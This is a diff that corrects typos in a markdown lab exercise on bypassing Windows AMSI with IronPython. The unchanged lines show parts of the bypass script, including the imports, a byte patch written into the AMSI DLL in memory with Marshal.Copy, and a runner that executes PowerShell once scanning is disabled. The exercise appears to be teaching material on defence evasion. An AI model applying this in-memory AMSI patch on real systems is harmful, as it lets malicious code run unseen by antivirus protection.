@@ -1,10 +1,10 @@
 # Exercise 6: AMSI Bypass with IronPython
 This exercise aims to build a script using IronPython to bypass the Anti-Malware Scan Interface (AMSI). AMSI is an open interface available on Windows 10 for applications to request, at runtime, a synchronous scan of a memory buffer by an installed antivirus or security solution. The script patches a specific method of the AMSI's DLL loaded in memory, therefore allowing malicious code to execute without detection.
 
-The script utilizes functionalities provided by the ctypes library in IronPython, which provides C compatible data types and allows to call functions in DLLs/shared libraries.
+The script utilizes functionalities provided by the ctypes library in IronPython, which provides C-compatible data types and allows to call functions in DLLs/shared libraries.
 
-1. First lets test that AMSI is working on the machine. Type `amsicontext` into the existing terminal
-2. You should see a maliware blocked error that looks like this
+1. First, let's test that AMSI is working on the machine. Type `amsicontext` into the existing terminal
+2. You should see a malware blocked error that looks like this
 
 ```powershell
 At line:1 char:1
@@ -15,7 +15,7 @@ This script contains malicious content and has been blocked by your antivirus so
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 ```
 
-3. Now let's write the bypass, by first creating another python file called powershell_amsi_bypass.py similiar to Exercise 5
+3. Now let's write the bypass by first creating another Python file called powershell_amsi_bypass.py, similar to Exercise 5
 4. Start by importing the required modules. `clr`` allows IronPython to interface with .NET and System provides access to core .NET functionalities. os is a Python library for interacting with the Operating System.
 
 ```python
@@ -24,14 +24,14 @@ import System
 import os
 ```
 
-5. Load the System.Management.Automation .NET library. System.Management.Automation provides access to the PowerShell runtime. Runspaces enables creating and managing PowerShell runspaces, which are containers that host PowerShell pipelines.
+5. Load the System.Management.Automation .NET library. System.Management.Automation provides access to the PowerShell runtime. Runspaces enable creating and managing PowerShell runspaces, which are containers that host PowerShell pipelines.
 
 ```python
 clr.AddReference("System.Management.Automation")
 from System.Management.Automation import Runspaces
 ```
 
-6. Import additional required modules and functions. These imports include both Python and .NET classes and functions used throughout the script. Notable ones are ctypes (provides C compatible data types in Python), IntPtr and UInt32 (.NET data types), and Marshal (.NET class for marshaling data between managed and unmanaged code).
+6. Import additional required modules and functions. These imports include both Python and .NET classes and functions used throughout the script. Notable ones are ctypes (provides C-compatible data types in Python), IntPtr and UInt32 (.NET data types), and Marshal (.NET class for marshaling data between managed and unmanaged code).
 
 ```python
 import clrtype
@@ -81,7 +81,7 @@ patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), Sys
 Marshal.Copy(patch, 0, BufferAddress, 6)
 ```
 
-12. Define the main function to run the bypass and execute a PowerShell script.After bypassing AMSI, the script opens a PowerShell runspace, executes the PowerShell command 'amsicontext', and prints the output.
+12. Define the main function to run the bypass and execute a PowerShell script. After bypassing AMSI, the script opens a PowerShell runspace, executes the PowerShell command 'amsicontext', and prints the output.
 
 ```python
 def main():
